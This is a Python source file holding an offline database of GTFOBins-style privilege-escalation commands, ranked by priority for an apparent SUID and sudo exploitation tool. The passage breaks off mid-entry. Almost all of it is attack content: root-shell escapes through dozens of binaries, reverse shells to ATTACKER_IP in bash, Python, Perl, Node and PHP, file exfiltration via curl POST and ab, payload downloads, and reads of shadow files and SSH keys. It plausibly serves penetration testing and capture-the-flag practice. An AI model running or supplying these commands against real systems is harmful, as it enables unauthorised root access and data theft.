"""
Exploit Commands Database for gtfobinSUID-improved
===================================================
Comprehensive offline database of GTFOBins exploitation commands.
Each entry contains SUID, Sudo, and Capabilities commands where applicable.

Priority levels:
  1 = Shell (instant root)
  2 = Reverse Shell
  3 = File Read (read shadow, proof.txt, SSH keys)
  4 = File Write (write SSH key, passwd, crontab)
  5 = Limited / Requires extra steps

Structure: COMMANDS[binary][mode][function] = (priority, command)
  mode: "suid", "sudo", "capabilities"
  function: "shell", "reverse_shell", "file_read", "file_write", "file_download", "file_upload"
"""

# fmt: off
COMMANDS = {}

# ============================================================================
# SHELLS / INTERPRETERS
# ============================================================================

COMMANDS["bash"] = {
    "suid": {
        "shell": (1, "bash -p"),
        "reverse_shell": (2, "bash -p -c 'exec bash -p -i &>/dev/tcp/ATTACKER_IP/PORT <&1'"),
        "file_read": (3, "bash -p -c 'echo \"$(</path/to/file)\"'"),
        "file_write": (4, "bash -p -c 'echo DATA >/path/to/file'"),
    },
    "sudo": {
        "shell": (1, "sudo bash"),
        "reverse_shell": (2, "sudo bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/PORT <&1'"),
        "file_read": (3, "sudo bash -c 'echo \"$(</path/to/file)\"'"),
        "file_write": (4, "sudo bash -c 'echo DATA >/path/to/file'"),
    },
    "capabilities": {},
}

COMMANDS["sh"] = {
    "suid": {
        "shell": (1, "sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo sh"),
    },
    "capabilities": {},
}

COMMANDS["dash"] = {
    "suid": {
        "shell": (1, "dash -p"),
    },
    "sudo": {
        "shell": (1, "sudo dash"),
    },
    "capabilities": {},
}

COMMANDS["zsh"] = {
    "suid": {
        "shell": (1, "zsh"),
    },
    "sudo": {
        "shell": (1, "sudo zsh"),
    },
    "capabilities": {},
}

COMMANDS["ksh"] = {
    "suid": {
        "shell": (1, "ksh -p"),
    },
    "sudo": {
        "shell": (1, "sudo ksh"),
    },
    "capabilities": {},
}

COMMANDS["csh"] = {
    "suid": {
        "shell": (1, "csh -b"),
    },
    "sudo": {
        "shell": (1, "sudo csh"),
    },
    "capabilities": {},
}

COMMANDS["ash"] = {
    "suid": {
        "shell": (1, "ash"),
    },
    "sudo": {
        "shell": (1, "sudo ash"),
    },
    "capabilities": {},
}

COMMANDS["fish"] = {
    "suid": {
        "shell": (1, "fish"),
    },
    "sudo": {
        "shell": (1, "sudo fish"),
    },
    "capabilities": {},
}

COMMANDS["rc"] = {
    "suid": {
        "shell": (1, "rc -p"),
    },
    "sudo": {
        "shell": (1, "sudo rc"),
    },
    "capabilities": {},
}

COMMANDS["yash"] = {
    "suid": {
        "shell": (1, "yash"),
    },
    "sudo": {
        "shell": (1, "sudo yash"),
    },
    "capabilities": {},
}

# ============================================================================
# PROGRAMMING LANGUAGES
# ============================================================================

COMMANDS["python"] = {
    "suid": {
        "shell": (1, "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"),
        "reverse_shell": (2, "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-p\"])'"),
        "file_read": (3, "python -c 'print(open(\"/path/to/file\").read())'"),
        "file_write": (4, "python -c 'open(\"/path/to/file\",\"w\").write(\"DATA\")'"),
    },
    "sudo": {
        "shell": (1, "sudo python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"),
        "file_read": (3, "sudo python -c 'print(open(\"/path/to/file\").read())'"),
        "file_write": (4, "sudo python -c 'open(\"/path/to/file\",\"w\").write(\"DATA\")'"),
    },
    "capabilities": {
        "shell": (1, "python -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'"),
    },
}

COMMANDS["perl"] = {
    "suid": {
        "shell": (1, "perl -e 'exec \"/bin/sh\";'"),
        "reverse_shell": (2, "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -p\");'"),
        "file_read": (3, "perl -ne 'print' /path/to/file"),
        "file_write": (4, "perl -e 'open(F,\">/path/to/file\");print F \"DATA\";close(F)'"),
    },
    "sudo": {
        "shell": (1, "sudo perl -e 'exec \"/bin/sh\";'"),
        "file_read": (3, "sudo perl -ne 'print' /path/to/file"),
    },
    "capabilities": {
        "shell": (1, "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"),
    },
}

COMMANDS["ruby"] = {
    "suid": {
        "shell": (1, "ruby -e 'exec \"/bin/sh -p\"'"),
        "file_read": (3, "ruby -e 'puts File.read(\"/path/to/file\")'"),
    },
    "sudo": {
        "shell": (1, "sudo ruby -e 'exec \"/bin/sh\"'"),
    },
    "capabilities": {
        "shell": (1, "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"),
    },
}

COMMANDS["lua"] = {
    "suid": {
        "shell": (1, "lua -e 'os.execute(\"/bin/sh -p\")'"),
    },
    "sudo": {
        "shell": (1, "sudo lua -e 'os.execute(\"/bin/sh\")'"),
    },
    "capabilities": {},
}

COMMANDS["node"] = {
    "suid": {
        "shell": (1, "node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'"),
        "reverse_shell": (2, "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[\"-p\"]);var client=new net.Socket();client.connect(PORT,\"ATTACKER_IP\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});})()'"),
    },
    "sudo": {
        "shell": (1, "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"),
    },
    "capabilities": {
        "shell": (1, "node -e 'process.setuid(0);require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"),
    },
}

COMMANDS["php"] = {
    "suid": {
        "shell": (1, "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"),
        "reverse_shell": (2, "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -p <&3 >&3 2>&3\");'"),
        "file_read": (3, "php -r 'echo file_get_contents(\"/path/to/file\");'"),
        "file_write": (4, "php -r 'file_put_contents(\"/path/to/file\",\"DATA\");'"),
    },
    "sudo": {
        "shell": (1, "sudo php -r 'system(\"/bin/sh\");'"),
        "file_read": (3, "sudo php -r 'echo file_get_contents(\"/path/to/file\");'"),
    },
    "capabilities": {},
}

COMMANDS["jjs"] = {
    "suid": {
        "shell": (1, "echo 'Java.type(\"java.lang.Runtime\").getRuntime().exec([\"/bin/sh\",\"-pc\",\"exec sh -p <$(tty) >$(tty) 2>$(tty)\"]).waitFor()' | jjs"),
    },
    "sudo": {
        "shell": (1, "echo 'Java.type(\"java.lang.Runtime\").getRuntime().exec(\"/bin/sh\").waitFor()' | sudo jjs"),
    },
    "capabilities": {},
}

COMMANDS["jrunscript"] = {
    "suid": {
        "shell": (1, "jrunscript -e 'java.lang.Runtime.getRuntime().exec(\"/bin/sh -pc sh\").waitFor()'"),
    },
    "sudo": {
        "shell": (1, "sudo jrunscript -e 'java.lang.Runtime.getRuntime().exec(\"/bin/sh\").waitFor()'"),
    },
    "capabilities": {},
}

COMMANDS["tclsh"] = {
    "suid": {
        "shell": (1, "echo 'exec /bin/sh -p <@stdin >@stdout 2>@stderr' | tclsh"),
    },
    "sudo": {
        "shell": (1, "echo 'exec /bin/sh <@stdin >@stdout 2>@stderr' | sudo tclsh"),
    },
    "capabilities": {},
}

COMMANDS["awk"] = {
    "suid": {
        "shell": (1, "awk 'BEGIN {system(\"/bin/sh -p\")}'"),
        "file_read": (3, "awk '{print}' /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo awk 'BEGIN {system(\"/bin/sh\")}'"),
        "file_read": (3, "sudo awk '{print}' /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["gawk"] = COMMANDS["awk"].copy()
COMMANDS["mawk"] = COMMANDS["awk"].copy()
COMMANDS["nawk"] = COMMANDS["awk"].copy()

# ============================================================================
# BATCH 1: MISSING BINARIES A-D
# ============================================================================

COMMANDS["aa-exec"] = {
    "suid": {
        "shell": (1, "aa-exec /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo aa-exec /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["ab"] = {
    "suid": {
        "file_upload": (3, "ab -p /path/to/file http://ATTACKER_IP/"),
        "file_download": (4, "ab -v2 http://ATTACKER_IP/path/to/file"),
    },
    "sudo": {
        "file_upload": (3, "sudo ab -p /path/to/file http://ATTACKER_IP/"),
    },
    "capabilities": {},
}

COMMANDS["agetty"] = {
    "suid": {
        "shell": (1, "agetty -l /bin/sh -o -p -a root tty"),
    },
    "sudo": {},
    "capabilities": {},
}

COMMANDS["arj"] = {
    "suid": {
        "file_read": (3, "arj a /tmp/x /path/to/file; arj p /tmp/x"),
        "file_write": (4, "echo DATA > /tmp/x; arj a /tmp/y /tmp/x; arj e /tmp/y /path/to/output-dir/"),
    },
    "sudo": {
        "file_read": (3, "sudo arj a /tmp/x /path/to/file; arj p /tmp/x"),
    },
    "capabilities": {},
}

COMMANDS["ascii-xfr"] = {
    "suid": {
        "file_read": (3, "ascii-xfr -ns /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ascii-xfr -ns /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["aspell"] = {
    "suid": {
        "file_read": (3, "aspell -c /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo aspell -c /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["atobm"] = {
    "suid": {
        "file_read": (3, "atobm /path/to/file 2>&1"),
    },
    "sudo": {
        "file_read": (3, "sudo atobm /path/to/file 2>&1"),
    },
    "capabilities": {},
}

COMMANDS["basenc"] = {
    "suid": {
        "file_read": (3, "basenc --base64 /path/to/file | basenc -d --base64"),
    },
    "sudo": {
        "file_read": (3, "sudo basenc --base64 /path/to/file | basenc -d --base64"),
    },
    "capabilities": {},
}

COMMANDS["basez"] = {
    "suid": {
        "file_read": (3, "basez /path/to/file | basez -d"),
    },
    "sudo": {
        "file_read": (3, "sudo basez /path/to/file | basez -d"),
    },
    "capabilities": {},
}

COMMANDS["bc"] = {
    "suid": {
        "file_read": (3, "bc -s /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo bc -s /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["bridge"] = {
    "suid": {
        "file_read": (3, "bridge -b /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo bridge -b /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["busctl"] = {
    "suid": {
        "shell": (1, "busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"),
    },
    "sudo": {
        "shell": (1, "sudo busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"),
    },
    "capabilities": {},
}

COMMANDS["cabal"] = {
    "suid": {
        "shell": (1, "cabal exec --project-file=/dev/null -- /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo cabal exec --project-file=/dev/null -- /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["choom"] = {
    "suid": {
        "shell": (1, "choom -n 0 -- /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo choom -n 0 /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["clamscan"] = {
    "suid": {
        "file_read": (3, "touch x.yara; clamscan --no-summary -d x.yara -f /path/to/file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"),
    },
    "sudo": {
        "file_read": (3, "touch x.yara; sudo clamscan --no-summary -d x.yara -f /path/to/file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"),
    },
    "capabilities": {},
}

COMMANDS["csplit"] = {
    "suid": {
        "file_read": (3, "csplit /path/to/file 1; cat xx00"),
    },
    "sudo": {
        "file_read": (3, "sudo csplit /path/to/file 1; cat xx00"),
    },
    "capabilities": {},
}

COMMANDS["csvtool"] = {
    "suid": {
        "shell": (1, "csvtool call '/bin/sh;false' /etc/hosts"),
        "file_read": (3, "csvtool trim t /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo csvtool call '/bin/sh;false' /etc/hosts"),
        "file_read": (3, "sudo csvtool trim t /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["cupsfilter"] = {
    "suid": {
        "file_read": (3, "cupsfilter -i application/octet-stream -m application/octet-stream /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo cupsfilter -i application/octet-stream -m application/octet-stream /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["dialog"] = {
    "suid": {
        "file_read": (3, "dialog --textbox /path/to/file 0 0"),
    },
    "sudo": {
        "file_read": (3, "sudo dialog --textbox /path/to/file 0 0"),
    },
    "capabilities": {},
}

COMMANDS["dig"] = {
    "suid": {
        "file_read": (3, "dig -f /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo dig -f /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["distcc"] = {
    "suid": {
        "shell": (1, "distcc /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo distcc /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["dosbox"] = {
    "suid": {
        "file_read": (3, "dosbox -c 'mount c /' -c 'type c:\\path\\to\\file'"),
        "file_write": (4, "dosbox -c 'mount c /' -c 'echo DATA > c:\\path\\to\\file'"),
    },
    "sudo": {
        "file_read": (3, "sudo dosbox -c 'mount c /' -c 'type c:\\path\\to\\file'"),
    },
    "capabilities": {},
}

# ============================================================================
# BATCH 2: MISSING BINARIES E-M
# ============================================================================

COMMANDS["efax"] = {
    "suid": {
        "file_read": (3, "efax -d /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo efax -d /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["elvish"] = {
    "suid": {
        "shell": (1, "elvish"),
        "file_read": (3, "elvish -c 'print (slurp </path/to/file)'"),
        "file_write": (4, "elvish -c 'print DATA >/path/to/file'"),
    },
    "sudo": {
        "shell": (1, "sudo elvish"),
        "file_read": (3, "sudo elvish -c 'print (slurp </path/to/file)'"),
    },
    "capabilities": {},
}

COMMANDS["eqn"] = {
    "suid": {
        "file_read": (3, "eqn /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo eqn /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["espeak"] = {
    "suid": {
        "file_read": (3, "espeak -qXf /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo espeak -qXf /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["gcore"] = {
    "suid": {
        "file_read": (3, "gcore $PID\n# Then: strings core.$PID"),
    },
    "sudo": {
        "file_read": (3, "sudo gcore $PID\n# Then: strings core.$PID"),
    },
    "capabilities": {},
}

COMMANDS["genie"] = {
    "suid": {
        "shell": (1, "genie -c /bin/sh"),
    },
    "sudo": {
        "shell": (1, "sudo genie -c /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["genisoimage"] = {
    "suid": {
        "file_read": (3, "genisoimage -q -o - /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo genisoimage -q -o - /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["gtester"] = {
    "suid": {
        "shell": (1, "gtester -p /dev/null --keep-going /bin/sh"),
    },
    "sudo": {
        "shell": (1, "sudo gtester -p /dev/null --keep-going /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["highlight"] = {
    "suid": {
        "file_read": (3, "highlight --no-doc --failsafe /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo highlight --no-doc --failsafe /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["hping3"] = {
    "suid": {
        "shell": (1, "hping3\n/bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo hping3\n/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["iconv"] = {
    "suid": {
        "file_read": (3, "iconv -f 8859_1 -t 8859_1 /path/to/file"),
        "file_write": (4, "echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo iconv -f 8859_1 -t 8859_1 /path/to/file"),
        "file_write": (4, "echo DATA | sudo iconv -f 8859_1 -t 8859_1 -o /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["ispell"] = {
    "suid": {
        "file_read": (3, "ispell /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ispell /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["jq"] = {
    "suid": {
        "file_read": (3, "jq -Rr . /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo jq -Rr . /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["julia"] = {
    "suid": {
        "shell": (1, "julia -e 'run(`/bin/sh -p`)'"),
        "file_read": (3, "julia -e 'print(open(f->read(f, String), \"/path/to/file\"))'"),
        "file_write": (4, "julia -e 'open(f->write(f, \"DATA\"), \"/path/to/file\", \"w\")'"),
    },
    "sudo": {
        "shell": (1, "sudo julia -e 'run(`/bin/sh`)'"),
        "file_read": (3, "sudo julia -e 'print(open(f->read(f, String), \"/path/to/file\"))'"),
    },
    "capabilities": {},
}

COMMANDS["ksshell"] = {
    "suid": {
        "file_read": (3, "ksshell -i /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo ksshell -i /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["kubectl"] = {
    "suid": {
        "file_upload": (3, "kubectl proxy --address=0.0.0.0 --port=12345 --www=/ --www-prefix=/x/"),
    },
    "sudo": {
        "shell": (1, "# Create kubeconfig with exec plugin pointing to /bin/sh\nkubectl get pods --kubeconfig=/path/to/malicious-kubeconfig"),
    },
    "capabilities": {},
}

COMMANDS["minicom"] = {
    "suid": {
        "shell": (1, "echo '! exec /bin/sh -p </dev/tty 1>/dev/tty 2>/dev/tty' > /tmp/mc.sh; minicom -D /dev/null -S /tmp/mc.sh"),
    },
    "sudo": {
        "shell": (1, "echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' > /tmp/mc.sh; sudo minicom -D /dev/null -S /tmp/mc.sh"),
    },
    "capabilities": {},
}

COMMANDS["mosquitto"] = {
    "suid": {
        "file_read": (3, "mosquitto -c /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo mosquitto -c /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["msgattrib"] = {
    "suid": {
        "file_read": (3, "msgattrib /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo msgattrib /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["msgcat"] = {
    "suid": {
        "file_read": (3, "msgcat /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo msgcat /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["msgconv"] = {
    "suid": {
        "file_read": (3, "msgconv /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo msgconv /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["msgfilter"] = {
    "suid": {
        "shell": (1, "echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2'"),
    },
    "sudo": {
        "shell": (1, "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2'"),
    },
    "capabilities": {},
}

COMMANDS["msgmerge"] = {
    "suid": {
        "file_read": (3, "msgmerge /path/to/file /dev/null"),
    },
    "sudo": {
        "file_read": (3, "sudo msgmerge /path/to/file /dev/null"),
    },
    "capabilities": {},
}

COMMANDS["msguniq"] = {
    "suid": {
        "file_read": (3, "msguniq /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo msguniq /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["multitime"] = {
    "suid": {
        "shell": (1, "multitime -n 1 /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo multitime -n 1 /bin/sh"),
    },
    "capabilities": {},
}


# ============================================================================
# FILE UTILITIES / COMMON SUID VECTORS
# ============================================================================

COMMANDS["find"] = {
    "suid": {
        "shell": (1, "find . -exec /bin/sh -p \\; -quit"),
        "file_read": (3, "find /path/to/file -exec cat {} \\;"),
        "file_write": (4, "find / -fprintf /path/to/file DATA -quit"),
    },
    "sudo": {
        "shell": (1, "sudo find . -exec /bin/sh \\; -quit"),
        "file_read": (3, "sudo find /path/to/file -exec cat {} \\;"),
    },
    "capabilities": {},
}

COMMANDS["cp"] = {
    "suid": {
        "file_read": (3, "cp /path/to/file /dev/stdout"),
        "file_write": (4, "echo 'DATA' | cp /dev/stdin /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo cp /path/to/file /dev/stdout"),
        "file_write": (4, "sudo cp /path/to/source /path/to/dest"),
    },
    "capabilities": {},
}

COMMANDS["mv"] = {
    "suid": {
        "file_write": (4, "mv /path/to/source /path/to/dest"),
    },
    "sudo": {
        "file_write": (4, "sudo mv /path/to/source /path/to/dest"),
    },
    "capabilities": {},
}

COMMANDS["cat"] = {
    "suid": {
        "file_read": (3, "cat /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo cat /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["head"] = {
    "suid": {
        "file_read": (3, "head -c 1G /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo head -c 1G /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["tail"] = {
    "suid": {
        "file_read": (3, "tail -c 1G /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo tail -c 1G /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["less"] = {
    "suid": {
        "shell": (1, "less /etc/passwd\n!/bin/sh -p"),
        "file_read": (3, "less /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo less /etc/passwd\n!/bin/sh"),
        "file_read": (3, "sudo less /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["more"] = {
    "suid": {
        "shell": (1, "more /etc/passwd\n!/bin/sh -p"),
        "file_read": (3, "more /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo more /etc/passwd\n!/bin/sh"),
        "file_read": (3, "sudo more /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["nano"] = {
    "suid": {
        "file_read": (3, "nano /path/to/file"),
        "file_write": (4, "nano /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo nano\n^R^X\nreset; sh 1>&0 2>&0"),
        "file_read": (3, "sudo nano /path/to/file"),
        "file_write": (4, "sudo nano /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["vim"] = {
    "suid": {
        "shell": (1, "vim -c ':!/bin/sh -p'"),
        "file_read": (3, "vim /path/to/file"),
        "file_write": (4, "vim -c ':w! /path/to/file' -c ':q'"),
    },
    "sudo": {
        "shell": (1, "sudo vim -c ':!/bin/sh'"),
        "file_read": (3, "sudo vim /path/to/file"),
    },
    "capabilities": {
        "shell": (1, "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\")'"),
    },
}

COMMANDS["vi"] = {
    "suid": {
        "shell": (1, "vi -c ':!/bin/sh -p'"),
        "file_read": (3, "vi /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo vi -c ':!/bin/sh'"),
    },
    "capabilities": {},
}

COMMANDS["ed"] = {
    "suid": {
        "shell": (1, "ed\n!/bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo ed\n!/bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["emacs"] = {
    "suid": {
        "shell": (1, "emacs -Q -nw --eval '(term \"/bin/sh -p\")'"),
        "file_read": (3, "emacs /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"),
    },
    "capabilities": {},
}

COMMANDS["pico"] = COMMANDS["nano"].copy()

COMMANDS["sed"] = {
    "suid": {
        "shell": (1, "sed -n '1e exec /bin/sh -p 1>&0' /etc/hosts"),
        "file_read": (3, "sed '' /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo sed -n '1e exec /bin/sh 1>&0' /etc/hosts"),
        "file_read": (3, "sudo sed '' /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["tar"] = {
    "suid": {
        "file_read": (3, "tar xf /path/to/file -I '/bin/sh -p -c \"cat 1>&2\"'"),
    },
    "sudo": {
        "shell": (1, "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"),
        "file_read": (3, "sudo tar xf /path/to/file -I '/bin/sh -c \"cat 1>&2\"'"),
    },
    "capabilities": {},
}

COMMANDS["zip"] = {
    "suid": {},
    "sudo": {
        "shell": (1, "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'"),
    },
    "capabilities": {},
}

COMMANDS["gzip"] = {
    "suid": {
        "file_read": (3, "gzip -f /path/to/file -t"),
    },
    "sudo": {
        "file_read": (3, "sudo gzip -f /path/to/file -t"),
    },
    "capabilities": {},
}

COMMANDS["bzip2"] = {
    "suid": {
        "file_read": (3, "bzip2 -dc /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo bzip2 -dc /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["wget"] = {
    "suid": {
        "file_read": (3, "wget -q -O- file:///path/to/file"),
        "file_write": (4, "wget http://ATTACKER_IP/file -O /path/to/file"),
        "file_download": (4, "wget http://ATTACKER_IP/file -O /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo wget -q -O- file:///path/to/file"),
        "file_write": (4, "sudo wget http://ATTACKER_IP/file -O /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["curl"] = {
    "suid": {
        "file_read": (3, "curl file:///path/to/file"),
        "file_write": (4, "curl http://ATTACKER_IP/file -o /path/to/file"),
        "file_upload": (3, "curl -X POST -d @/path/to/file http://ATTACKER_IP/"),
    },
    "sudo": {
        "file_read": (3, "sudo curl file:///path/to/file"),
        "file_write": (4, "sudo curl http://ATTACKER_IP/file -o /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["chmod"] = {
    "suid": {
        "file_write": (4, "chmod 0777 /path/to/file"),
    },
    "sudo": {
        "file_write": (4, "sudo chmod 0777 /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["chown"] = {
    "suid": {
        "file_write": (4, "chown $(id -un):$(id -gn) /path/to/file"),
    },
    "sudo": {
        "file_write": (4, "sudo chown $(id -un):$(id -gn) /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["chroot"] = {
    "suid": {
        "shell": (1, "chroot / /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo chroot / /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["dd"] = {
    "suid": {
        "file_read": (3, "dd if=/path/to/file"),
        "file_write": (4, "echo 'DATA' | dd of=/path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo dd if=/path/to/file"),
        "file_write": (4, "echo 'DATA' | sudo dd of=/path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["diff"] = {
    "suid": {
        "file_read": (3, "diff --line-format=%L /dev/null /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo diff --line-format=%L /dev/null /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["tee"] = {
    "suid": {
        "file_write": (4, "echo 'DATA' | tee /path/to/file"),
    },
    "sudo": {
        "file_write": (4, "echo 'DATA' | sudo tee /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["sort"] = {
    "suid": {
        "file_read": (3, "sort /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo sort /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["uniq"] = {
    "suid": {
        "file_read": (3, "uniq /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo uniq /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["cut"] = {
    "suid": {
        "file_read": (3, "cut -d '' -f1 /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo cut -d '' -f1 /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["grep"] = {
    "suid": {
        "file_read": (3, "grep '' /path/to/file"),
    },
    "sudo": {
        "file_read": (3, "sudo grep '' /path/to/file"),
    },
    "capabilities": {},
}

COMMANDS["xargs"] = {
    "suid": {
        "shell": (1, "xargs -a /dev/null sh -p"),
        "file_read": (3, "xargs -a /dev/null -I {} cat /path/to/file"),
    },
    "sudo": {
        "shell": (1, "sudo xargs -a /dev/null sh"),
    },
    "capabilities": {},
}

COMMANDS["env"] = {
    "suid": {
        "shell": (1, "env /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo env /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["nice"] = {
    "suid": {
        "shell": (1, "nice /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo nice /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["ionice"] = {
    "suid": {
        "shell": (1, "ionice /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo ionice /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["timeout"] = {
    "suid": {
        "shell": (1, "timeout 7d /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo timeout 7d /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["time"] = {
    "suid": {
        "shell": (1, "time /bin/sh -p"),
    },
    "sudo": {
        "shell": (1, "sudo /usr/bin/time /bin/sh"),
    },
    "capabilities": {},
}

COMMANDS["strace"] = {
    "suid": {
        "shell": (1, "strace -o /dev/null /bin/sh -p"),
    },
    "sudo": {
